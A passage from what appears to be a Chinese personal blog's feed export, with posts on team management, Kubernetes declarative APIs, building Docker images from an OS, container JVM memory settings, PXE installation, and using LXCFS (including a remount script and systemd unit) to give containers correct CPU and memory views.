<h3 id="团队管理-1"><a href="#团队管理-1" class="headerlink" title="团队管理"></a>团队管理</h3><p>把羊群变成有战斗力的狼群，表现好的由于受到重视会加倍努力，表现的越来越好；原本不被看重的员工则越来越差，最后悄然离职，鼓励团队成员积极探索，乐于分享与承担的工作氛围，不断学习，追求进步</p>
<h2 id="领导力风格建设"><a href="#领导力风格建设" class="headerlink" title="领导力风格建设"></a>领导力风格建设</h2><p>团队肯定是需要一个组长或者说领导，那领导需要具有一定的能力能够影响或者驱动团队成员高质量的完成工作，肯定是具有强大的业务能力这个硬技能，作为一线的班组长，只有具备扎实的业务技能，才能首先在团队中建立一定的影响力。但是每个团队的可能存在不同方向的事情，组长需要掌握一定的软技能才能驱动团队高质量完成目标，例如沟通能力、项目管理能力、压力管理。这方面的提高目前需要通过参加多种相关培训，阅读项目管理与团队管理的书籍。这里面会有很多案例来指导项目管理中遇到的问题。俗话说，书读历史才能掌握未来，这个用到项目管理里面应该是类似的道理<br><img src="/2021/01/15/%E5%9B%A2%E9%98%9F%E7%AE%A1%E7%90%86/%E9%A2%86%E5%AF%BC%E5%8A%9B.png" alt="avatar"></p>
<h2 id="业务目标分解与跟踪"><a href="#业务目标分解与跟踪" class="headerlink" title="业务目标分解与跟踪"></a>业务目标分解与跟踪</h2><p>团队肯定是要承担业务相关的工作，这里就需要进行业务目标的拆解，根据团队成员的差异化能力，制定差异化的细化目标，目标管理是整个团队中最重要的事情之一。作为管理者应该愿意花时间和组内成员一起讨论、制定目标。在目标分解过程中，给与帮助和知道，及时对焦纠偏，确保目标达成。这样既是对自己负责，也是对团队成员负责。常用的方式包括OKR原则和SMART原则。所谓SMART原则，即：目标必须是具体的（Specific）,目标必须是可以衡量的（Measurable）,目标必须是可以达到的（Attainable）,目标必须和其他目标具有相关性（Relevant）,目标必须具有明确的截止期限（Time-based）,在团队里推行日总结、站立会，定时同步进度，遇到风险的能够及时反馈，作为团队组长也需要主动识别到风险，并对目标做响应的调整<br><img src="/2021/01/15/%E5%9B%A2%E9%98%9F%E7%AE%A1%E7%90%86/smart.png" alt="avatar"></p>
<h2 id="360度绩效评价"><a href="#360度绩效评价" class="headerlink" title="360度绩效评价"></a>360度绩效评价</h2><p>业绩评价是运用数理统计和运筹学的方法，通过建立综合评价指标体系，对照相应的评价标准，定量分析与定性分析相结合。360度绩效评估，又称“360度绩效反馈”或“全方位评估”，最早由被誉为“美国力量象征”的典范企业英特尔首先提出并加以实施的。从多个方面对员工绩效进行评价，以理论为指导，结合团队实际情况进行评价，公平/公正/责任/尊重。</p>
<p><img src="/2021/01/15/%E5%9B%A2%E9%98%9F%E7%AE%A1%E7%90%86/360.png" alt="avatar"></p>
<h2 id="有效沟通"><a href="#有效沟通" class="headerlink" title="有效沟通"></a>有效沟通</h2><p>因人而异进行沟通</p>
<p><img src="/2021/01/15/%E5%9B%A2%E9%98%9F%E7%AE%A1%E7%90%86/goutong.png" alt="avatar"></p>
]]></content>
  </entry>
  <entry>
    <title>声明式API</title>
    <url>/2020/12/07/%E5%A3%B0%E6%98%8E%E5%BC%8FAPI/</url>
    <content><![CDATA[<p>声明式API的核心原理，就是当用户向 Kubernetes 提交了一个 API 对象的描述之后，Kubernetes 会负责为你保证整个集群里各项资源的状态，都与你的 API 对象描述的需求相一致。更重要的是，这个保证是一项“无条件的”、“没有期限”的承诺：对于每个保存在 etcd 里的 API 对象，Kubernetes 都通过启动一种叫做“控制器模式”（Controller Pattern）的无限循环，不断检查，然后调谐，最后确保整个集群的状态与这个 API 对象的描述一致。</p>
<p>简单理解就是对象的声明与对象的创建相解耦，在普通程序中创建对象需要向操作系统申请资源，相似的，在容器云平台上创建对象，需要向k8s申请资源。但k8s更进一步的是，你只需要提交一个申请单，然后由k8s系统完成对象的创建。</p>
<blockquote>
<p>命令式编程：命令“机器”如何去做事情(how)，这样不管你想要的是什么(what)，它都会按照你的命令实现。</p>
</blockquote>
<blockquote>
<p>声明式编程：告诉“机器”你想要的是什么(what)，让机器想出如何去做(how)。</p>
</blockquote>
<p>下面这个例子如下所示：</p>
<p><img src="/2020/12/07/%E5%A3%B0%E6%98%8E%E5%BC%8FAPI/1.png" alt="avatar"></p>
]]></content>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>基于操作系统制作一个docker镜像</title>
    <url>/2021/01/14/%E5%9F%BA%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AADocker%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<p>整理了一下如何将Linux 操作系统 转换为docker镜像，这里可以适用于x86\arm\mpis等架构下，命令行操作如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar --numeric-owner --exclude&#x3D;&#x2F;proc --exclude&#x3D;&#x2F;sys  -cvf &#x2F;home&#x2F;linux-base.tar &#x2F;</span><br></pre></td></tr></table></figure>
<p>其中</p>
<ol>
<li>–numeric-owner 以UID和GID代替用户名和组名</li>
<li>–exclude=/proc –exclude=/sys  在新的docker镜像不包括上述目录</li>
<li>-cvf 压缩命令</li>
<li>/home/linux-base.tar 目标文件</li>
<li>/ 代表根下开始</li>
</ol>
<p>将生成的压缩文件导入到docker，执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cat .&#x2F;linux-base.tar |docker import - linux-base</span><br><span class="line"></span><br><span class="line">$docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">linux-base        latest              d3455babc696e        1 minutes ago      1.67GB</span><br></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run linux-base:latest echo cat &#x2F;etc&#x2F;redhat-release</span><br><span class="line">cat &#x2F;etc&#x2F;redhat-release</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>容器内Tomcat的JVM内存配置</title>
    <url>/2020/09/04/%E5%AE%B9%E5%99%A8%E5%86%85Tomcat%E7%9A%84JVM%E5%86%85%E5%AD%98%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>1、<br>JVM内存分配机制</p>
<p>编写测试Demo</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -itd -p 8080:8080 tomcat:8.5.29</span><br><span class="line">docker cp demo&#x2F; cas233af:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps</span><br><span class="line">docker restart cas233af</span><br><span class="line">curl http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;demo&#x2F;jvm&#x2F;hello</span><br><span class="line">&#123;&quot;totalMemory&quot;:&quot;124 M&quot;,&quot;maxMemory&quot;:&quot;405 M&quot;,&quot;freeMemory&quot;:&quot;72 M&quot;&#125;</span><br><span class="line"></span><br><span class="line">[root@localhost tomcatjvm]# free -m</span><br><span class="line">                     total        used        free      shared  buff&#x2F;cache   available</span><br><span class="line">Mem:           1823         408        1028           8         386        1198</span><br><span class="line">Swap:          2047           0        2047</span><br></pre></td></tr></table></figure>

<p>3、测试<br>基于社区的Tomcat进行测试</p>
<p>4、修改<br> 容器启动时，获取该容器的内存，并进行修改JAVA的最大可用内存，下图为tomcat的内存配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">limit_in_bytes&#x3D;$(cat &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;memory.limit_in_bytes)</span><br><span class="line">echo $limit_in_bytes</span><br><span class="line"># If not default limit_in_bytes in cgroup</span><br><span class="line">if [ &quot;$limit_in_bytes&quot; -ne &quot;9223372036854771712&quot; ]</span><br><span class="line">then</span><br><span class="line">        limit_in_megabytes&#x3D;&#96;expr $&#123;limit_in_bytes&#125; &#x2F; 1048576&#96;</span><br><span class="line">        echo $limit_in_megabytes</span><br><span class="line">        heap_size&#x3D;$limit_in_megabytes</span><br><span class="line">        export JAVA_OPTS&#x3D;&quot;-Xms$&#123;heap_size&#125;m -Xmx$&#123;heap_size&#125;m $JAVA_OPTS&quot;</span><br><span class="line">fi</span><br><span class="line">exec &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;bin&#x2F;catalina.sh run</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>操作系统安装流程</title>
    <url>/2021/01/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<p>几个主要的流程</p>
<ol>
<li>通用流程：首先，bios启动，选择操作系统的启动（安装）模式（此时，内存是空白的），然后根据相关的安装模式，寻找操作系统的引导程序（不同的模式，对应不同的引导程序当然也对应着不同的引导程序存在的位置），引导程序加载文件系统初始化（initrd）程序和内核初始镜像（vmlinuz），完成操作系统安装前的初始化；接着，操作系统开始安装相关的系统和应用程序。</li>
<li>硬盘安装的流程：bios启动——MBR寻找grub——grub程序读取menu.list等配置文件，找到内核启动镜像和相关初始化程序，安装（或者启动）。</li>
<li>PXE(Pre-boot Execution Environment)是由Intel设计，可以使计算机通过网络启动的协议。协议分为client和server两端，PXE client在网卡的ROM中，当计算机启动时，BIOS把PXE client调入内存执行，并显示出命令菜单，经用户选择后，PXE<br>client将放置在远端的操作系统通过网络下载到本地运行。</li>
<li>pxe网络安装的流程：bios启动——pxe client中的程序进入内存，显示命令菜单——此程序开始寻找网络引导程序（bootstrap文件，这个文件的名字随着发行版的不同而不同，在centos中，它是pxelinux.0）——引导程序读取配置文件pxelinux.cfg，<br>获得系统初始化的相关文件信息——系统启动，开始进行安装。</li>
</ol>
<p><a href="https://www.cnblogs.com/struggle-1216/p/11764647.html" target="_blank" rel="noopener">https://www.cnblogs.com/struggle-1216/p/11764647.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>容器资源隔离CPU与内存</title>
    <url>/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/</url>
    <content><![CDATA[<p>容器技术提供了不同于传统虚拟机技术的资源隔离方式，容器的打包和启动速度得到提高，但是却降低了容器的隔离强度，这里就有一个资源视图的隔离问题，容器可以通过cgroup的方式对资源的使用情况进行限制，包括内存、cpu等，但是如果一些进程使用一些常用的监控命令，例如free top等命令，其实看到的还是物理机的数据，而非容器的数据，这是由于容器并没有做到对/proc,/sys等文件的资源视图隔离，我们知道容器中看到的/proc伪文件系统的信息是宿主的/proc，没有隔离/proc 意味着获取不到容器中进程相关的proc信息。另外，一些需要读取proc信息的应用，会获取到错误的数据。 常用的proc伪文件系统包括：/proc/meminfo,/proc/cpuinfo, /proc/stat, /proc/uptime, /proc/loadavg等，举一个Java开发者常遇到的问题，当我们在启动JVM时，通常需要给容器设置JVM的内存参数，才能正确使用容器内存。</p>
<p>解决资源视图隔离问题的必要性</p>
<ol>
<li>从容器的视角来看，通常一些业务开发者已经习惯了传统的物理机、虚拟机，在这些强隔离的宿主机上可以使用top、free等命令查看系统的资源使用情况，但是在容器内无法做到这一点，“越界”查看到了宿主机的信息</li>
<li>从应用程序的角度，在容器内运行进程和在物理机运行进程，其实运行环境是不同的，并且可能存在一些安全隐患<br>2.1  例如java的JVM会使用free 查看内存，并尝试使用这个值用于设置JVM内存大小，这里很容易出现OOM<br>2.2 例如golang程序中，使用runtime.NumCPU获得CPU数量，并用这个值启动相应数量的进程 </li>
</ol>
<h2 id="FUSE文件系统"><a href="#FUSE文件系统" class="headerlink" title="FUSE文件系统"></a>FUSE文件系统</h2><p>FUSE（用户态文件系统）是一个实现在用户空间的文件系统框架，通过FUSE内核模块的支持，使用者只需要根据fuse提供的接口实现具体的文件操作就可以实现一个文件系统。在fuse出现以前，Linux中的文件系统都是完全实现在内核态，编写一个特定功能的文件系统，不管是代码编写还是调试都不太方便，就算是仅仅在现有传统文件系统上添加一个小小的功能，因为是在内核中实现仍需要做很大的工作量。在用户态文件系统FUSE出现后(2.6内核以后都支持fuse)，就会大大的减少工作量，也会很方便的进行调试。编写FUSE文件系统时，只需要内核加载了fuse内核模块即可，不需要重新编译内核。</p>
<p>完整的fuse功能包括a）用户态customize文件系统b）用户态fuse库（libfuse）c）内核支持（fs/fuse/*），共3层结构协作完成。</p>
<p> <img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/6.jpg" alt="avatar"></p>
<h3 id="以用户态内核态看FUSE"><a href="#以用户态内核态看FUSE" class="headerlink" title="以用户态内核态看FUSE"></a>以用户态内核态看FUSE</h3><p><img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/13.jpg" alt="avatar"></p>
<p>FUSE的工作原理如上图所示。假设基于FUSE的用户态文件系统hello挂载在/tmp/fuse目录下。当应用层程序要访问/tmp/fuse下的文件时，通过glibc中的函数进行系统调用，处理这些系统调用的VFS中的函数会调用FUSE在内核中的文件系统；内核中的FUSE文件系统将用户的请求，发送给用户态文件系统hello；用户态文件系统收到请求后，进行处理，将结果返回给内核中的FUSE文件系统；最后，内核中的FUSE文件系统将数据返回给用户态程序。</p>
<h3 id="fuse举例"><a href="#fuse举例" class="headerlink" title="fuse举例"></a>fuse举例</h3><p>这里引用知乎上的一个<a href="https://zhuanlan.zhihu.com/p/106719192?utm_source=wechat_session" target="_blank" rel="noopener">文章</a>,如果已经使用fuse开发了一套文件系统，例如叫zfuse，这里首先将zfuse挂载到了/mnt/fuse 目录，如果我们要创建/mnt/fuse/my.log文件，会发生什么呢？</p>
<p> <img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/7.jpg" alt="avatar"></p>
<ol>
<li>此时 open系统调用进入kernel space，vfs层根据挂载点文件的操作函数对应到fuse_create_open，此时已经工作在内核态，但是在fuse_create_open内会创建一个包含FUSE_CREATE操作数的消息</li>
<li>将FUSE_CREATE的消息通过管道文件发送给管道另一端的用户态接收进程，即我们自定义的zfuse文件系统进行处理，处理这个消息的进程在ZFUSE挂载时由libfuse库代码中创建，作用是读取管道文件消息并根据消息的操作数来执行对应操作，在这里解析到的是FUSE_CREATE操作数，对应libfuse库中的fuse_lib_create函数。</li>
<li>zfuse的作用，libfuse只是将操作接口与内核VFS做到一一对接，而真正完成操作的还是ZFUSE，在fuse_lib_create中会调用ZFUSE内定义的create函数</li>
<li>libfuse接口的作用，解耦合，简化ZFUSE开发。假设ZFUSE不需要lseek操作，那么就不需要实现lseek操作，而我们无法控制用户的行为，这里用户是指ZFUSE文件系统的使用者。假设用户在使用ZFUSE时进行了lseek操作，那么会先由libfuse提供的fuse_lib_lseek接口处理，libfuse发现ZFUSE没有实现lseek，就直接返回不支持此操作。</li>
</ol>
<h3 id="具体的实现流程"><a href="#具体的实现流程" class="headerlink" title="具体的实现流程"></a>具体的实现流程</h3><p> <img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/8.jpg" alt="avatar"></p>
<ol>
<li>ZFUSE挂载到/mnt/fuse，libfuse会fork出后台进程，用于读取管道文件消息。</li>
<li>用户使用ZFUSE文件系统，创建文件my.log</li>
<li>调用系统调用</li>
<li>经VFS交由fuse处理</li>
<li>fuse下的create处理，向管道发送带创建操作（FUSE_CREATE）的消息，当前进程A加入等待队列</li>
<li>libfuse下创建的后台进程读取到消息，解析操作数为FUSE_CREATE，对应到fuse_lib_create，即low level层接口。</li>
<li>fuse_lib_create中调用ZFUSE的上层接口zfuse.create，由ZFUSE来实现创建操作</li>
<li>完成创建后，通过libfuse中的fuse_reply_create向管道发送完成消息从而唤醒之前加入等待队列的进程A</li>
<li>进程A得到创建成功的消息，系统调用结束，/mnt/fuse/my.log文件创建成功</li>
</ol>
<h3 id="用libfuse创建FUSE文件系统"><a href="#用libfuse创建FUSE文件系统" class="headerlink" title="用libfuse创建FUSE文件系统"></a>用libfuse创建FUSE文件系统</h3><p><a href="https://www.lijiaocn.com/%E6%8A%80%E5%B7%A7/2019/01/21/linux-fuse-filesystem-in-userspace-usage.html" target="_blank" rel="noopener">比较详细的讲解libfuse使用</a></p>
<h2 id="LXCFS"><a href="#LXCFS" class="headerlink" title="LXCFS"></a>LXCFS</h2><p>LXCFS是一个简单的用户文件系统，用于解决当前linux kernel的一些局限性，让容器更能感觉为是一个独立的系统，使用libfuse库基于C开发完成，主要提供两个方面</p>
<ol>
<li>提供一系列可以绑定的文件，从而使cgroup能够感知</li>
<li>一个容器可以感知的cgroupfs-like tree</li>
</ol>
<p>lxcfs 是一个开源的fuse文件系统,<a href="https://github.com/lxc/lxcfs" target="_blank" rel="noopener">项目地址</a>，用于让linux 容器更像虚拟机，让容器内的应用在读取内存和 CPU 信息的时候通过 lxcfs 的映射，转到自己的通过对 cgroup 中容器相关定义信息读取的虚拟数据上。<font size="6">将lxcfs的文件挂载到容器内后，容器内的进程在基于/proc 获取容器的CPU和内存时，即读取这些文件时，lxcfs文件系统会获取该容器的1号进程的宿主机ID，将这个读取操作转换为读取宿主机对应容器cgrroup配置文件的信息，从而实现获取正确的容器CPU和内存。</font></p>
<p>原来lxcfs是LXC容器的一个辅助项目，但是现在可以被任意的runtim使用，lxcfs通过用户态文件系统，在容器内提供以下文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;proc&#x2F;cpuinfo</span><br><span class="line">&#x2F;proc&#x2F;diskstats</span><br><span class="line">&#x2F;proc&#x2F;meminfo</span><br><span class="line">&#x2F;proc&#x2F;stat</span><br><span class="line">&#x2F;proc&#x2F;swaps</span><br><span class="line">&#x2F;proc&#x2F;uptime</span><br></pre></td></tr></table></figure>

<p>如下图所示，把宿主机的 /var/lib/lxcfs/proc/memoinfo 文件挂载到Docker容器的/proc/meminfo位置后。容器中进程读取相应文件内容时，LXCFS的FUSE实现会从容器对应的Cgroup文件中读取正确的内存限制。从而使得应用获得正确的资源约束设定。</p>
<p><img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/11.png" alt="avatar"></p>
<p>详细讲解lxcfs，<a href="https://www.lijiaocn.com/%E6%8A%80%E5%B7%A7/2019/02/11/lxcfs-support-cpu-share-and-cpu-quota-1.html" target="_blank" rel="noopener">源码分析</a></p>
<h2 id="LXCFS-for-Kubernetes"><a href="#LXCFS-for-Kubernetes" class="headerlink" title="LXCFS for Kubernetes"></a>LXCFS for Kubernetes</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install fuse fuse-lib fuse-devel</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;denverdino&#x2F;lxcfs-admission-webhook.git</span><br><span class="line">cd lxcfs-admission-webhook</span><br><span class="line">bash deployment&#x2F;install.sh</span><br><span class="line">kubectl apply -f deployment&#x2F;lxcfs-daemonset.yaml</span><br><span class="line"></span><br><span class="line">设置namespace内开启lxcfs注解的设置，这里一定不要为lxcfs-daemonset所在的命名空间开启，否则导致启动失败</span><br><span class="line">也可以不在namespace设置，只需要在创建的Pod中设置就可以</span><br><span class="line">kubectl label namespace default lxcfs-admission-webhook&#x3D;enabled</span><br></pre></td></tr></table></figure>

<p>测试效果如下所示</p>
<p>Pod的limit参数配置了8个CPU，24G 内存</p>
<p> <img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/18.png" alt="avatar"></p>
<p>在容器内只能查看到25G内存</p>
<p><img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/19.png" alt="avatar"></p>
<p>在容器内只能查看到6个CPU</p>
<p><img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/20.png" alt="avatar"></p>
<p>这种交由k8s进行管理，估计会有些风险，将这个服务交由systemd 进行管理，运行在宿主机上，可能更安全一些。</p>
<h2 id="lxcfs服务重启"><a href="#lxcfs服务重启" class="headerlink" title="lxcfs服务重启"></a>lxcfs服务重启</h2><p>lxcfs服务重启，会导致原正常使用的容器无法查看cpu、内存，这是因为 lxcfs重启后，/var/lib/lxcfs会删除再重建，inode变了，会出现如下错误</p>
<p><img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/4.png" alt="avatar"></p>
<p><img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/5.png" alt="avatar"></p>
<p>当lxcfs服务重启后，需要对容器挂载的响应目录进行重新挂载，lxcfs issue 列表中对这个问题进行了讨论，<a href="https://github.com/lxc/lxcfs/issues/193" target="_blank" rel="noopener">issue 193</a>github上有人整理的remount的脚本代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br><span class="line"></span><br><span class="line">PATH=$PATH:/bin</span><br><span class="line">LXCFS="/var/lib/lxc/lxcfs"</span><br><span class="line">LXCFS_ROOT_PATH="/var/lib/lxc"</span><br><span class="line"></span><br><span class="line">containers=$(docker ps | grep -v pause  | grep -v calico | awk '&#123;print $1&#125;' | grep -v CONTAINE)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">-v /var/lib/lxc/lxcfs/proc/cpuinfo:/proc/cpuinfo:rw</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-v /var/lib/lxc/lxcfs/proc/diskstats:/proc/diskstats:rw</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-v /var/lib/lxc/lxcfs/proc/meminfo:/proc/meminfo:rw</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-v /var/lib/lxc/lxcfs/proc/<span class="built_in">stat</span>:/proc/<span class="built_in">stat</span>:rw</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-v /var/lib/lxc/lxcfs/proc/swaps:/proc/swaps:rw</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-v /var/lib/lxc/lxcfs/proc/uptime:/proc/uptime:rw</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-v /var/lib/lxc/lxcfs/proc/loadavg:/proc/loadavg:rw</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-v /var/lib/lxc/lxcfs/sys/devices/system/cpu/online:/sys/devices/system/cpu/online:rw</span></span><br><span class="line">for container in $containers;do</span><br><span class="line">	mountpoint=$(docker inspect --format '&#123;&#123; range .Mounts &#125;&#125;&#123;&#123; if eq .Destination "/var/lib/lxc" &#125;&#125;&#123;&#123; .Source &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;' $container)</span><br><span class="line">	if [ "$mountpoint" = "$LXCFS_ROOT_PATH" ];then</span><br><span class="line">		echo "remount $container"</span><br><span class="line">		PID=$(docker inspect --format '&#123;&#123;.State.Pid&#125;&#125;' $container)</span><br><span class="line"><span class="meta">		#</span><span class="bash"> mount /proc</span></span><br><span class="line">		for file in meminfo cpuinfo loadavg stat diskstats swaps uptime;do</span><br><span class="line">			echo nsenter --target $PID --mount --  mount -B "$LXCFS/proc/$file" "/proc/$file"</span><br><span class="line">			nsenter --target $PID --mount --  mount -B "$LXCFS/proc/$file" "/proc/$file"</span><br><span class="line">		done</span><br><span class="line"><span class="meta">		#</span><span class="bash"> mount /sys</span></span><br><span class="line">		for file in online;do</span><br><span class="line">			echo nsenter --target $PID --mount --  mount -B "$LXCFS/sys/devices/system/cpu/$file" "/sys/devices/system/cpu/$file"</span><br><span class="line">			nsenter --target $PID --mount --  mount -B "$LXCFS/sys/devices/system/cpu/$file" "/sys/devices/system/cpu/$file"</span><br><span class="line">		done </span><br><span class="line">	fi </span><br><span class="line">done</span><br></pre></td></tr></table></figure>


<p>但是仍然存在一个问题，如何感知到lxcfs什么时候重启，因为只有知道了lxcfs进行了重启，我们才能对容器进行remount操作，这里有提供一个(方案)[<a href="https://github.com/alibaba/pouch/issues/140]" target="_blank" rel="noopener">https://github.com/alibaba/pouch/issues/140]</a></p>
<ol>
<li>将以下卷挂载到容器,除了挂载proc相关的卷，这里增加了/var/lib/lxc/:/var/lib/lxc/:shared</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-v &#x2F;var&#x2F;lib&#x2F;lxc&#x2F;:&#x2F;var&#x2F;lib&#x2F;lxc&#x2F;:shared  \</span><br><span class="line">-v &#x2F;var&#x2F;lib&#x2F;lxc&#x2F;lxcfs&#x2F;proc&#x2F;uptime:&#x2F;proc&#x2F;uptime \</span><br><span class="line">-v &#x2F;var&#x2F;lib&#x2F;lxc&#x2F;lxcfs&#x2F;proc&#x2F;swaps:&#x2F;proc&#x2F;swaps  \</span><br><span class="line">-v &#x2F;var&#x2F;lib&#x2F;lxc&#x2F;lxcfs&#x2F;proc&#x2F;stat:&#x2F;proc&#x2F;stat  \</span><br><span class="line">-v &#x2F;var&#x2F;lib&#x2F;lxc&#x2F;lxcfs&#x2F;proc&#x2F;diskstats:&#x2F;proc&#x2F;diskstats \</span><br><span class="line">-v &#x2F;var&#x2F;lib&#x2F;lxc&#x2F;lxcfs&#x2F;proc&#x2F;meminfo:&#x2F;proc&#x2F;meminfo \</span><br><span class="line">-v &#x2F;var&#x2F;lib&#x2F;lxc&#x2F;lxcfs&#x2F;proc&#x2F;cpuinfo:&#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure>
<p>如果是k8s pod 时，建议以以下的方式进行挂载<br><img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/21.png" alt="avatar"></p>
<p><img src="/2021/07/05/%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BBCPU%E4%B8%8E%E5%86%85%E5%AD%98/22.png" alt="avatar"></p>
<ol start="2">
<li>使用systemd 管理lxcfs服务，在service 文件中增加重启或者服务恢复时的重新remount操作</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先下载lxcfs的源码，编译安装</span><br><span class="line">yum install fuse fuse-lib fuse-devel</span><br><span class="line">yum -y install fuse-devel pam-devel wget install gcc automake autoconf libtool make</span><br><span class="line">需要使用3.1.2 版本</span><br><span class="line">git clone git:&#x2F;&#x2F;github.com&#x2F;lxc&#x2F;lxcfs</span><br><span class="line">cd lxcfs</span><br><span class="line">.&#x2F;bootstrap.sh</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;lxcfs.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description&#x3D;FUSE filesystem for LXC</span><br><span class="line">ConditionVirtualization&#x3D;!container</span><br><span class="line">Before&#x3D;lxc.service</span><br><span class="line">Documentation&#x3D;man:lxcfs(1)</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;lxcfs &#x2F;var&#x2F;lib&#x2F;lxc&#x2F;lxcfs&#x2F;</span><br><span class="line">KillMode&#x3D;process</span><br><span class="line">Restart&#x3D; always</span><br><span class="line">ExecStopPost&#x3D;-&#x2F;bin&#x2F;fusermount -u &#x2F;var&#x2F;lib&#x2F;lxc&#x2F;lxcfs</span><br><span class="line">Delegate&#x3D;yes</span><br><span class="line"></span><br><span class="line"># add remount script</span><br><span class="line">ExecStartPost&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;container_remount_lxcfs.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br><span class="line">&#96;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>当lxcfs服务重启时，会调用/usr/local/bin/container_remount_lxcfs.sh 脚本对全部容器进行重新remount</li>
</ol>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>数据并行-模型并行-流水线并行</title>
    <url>/2022/08/13/%E6%95%B0%E6%8D%AE%E5%B9%B6%E8%A1%8C-%E6%A8%A1%E5%9E%8B%E5%B9%B6%E8%A1%8C-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%B9%B6%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="数据并行（DP-）"><a href="#数据并行（DP-）" class="headerlink" title="数据并行（DP ）"></a>数据并行（DP ）</h2><h3 id="1、概念："><a href="#1、概念：" class="headerlink" title="1、概念："></a>1、概念：</h3><p>相同的模型分布在不同的GPU上，在不同的GPU上使用不同的数据。每一张GPU上有相同的参数，在训练的时候每一个GPU训练不同的数据，相当于增大了训练时候的batch_size。数据并行基于一个假设：所有节点都可以放下整个模型。这个假设在某些模型上（如GPT3）是不合理的，因此我们还需要模型并行。</p>
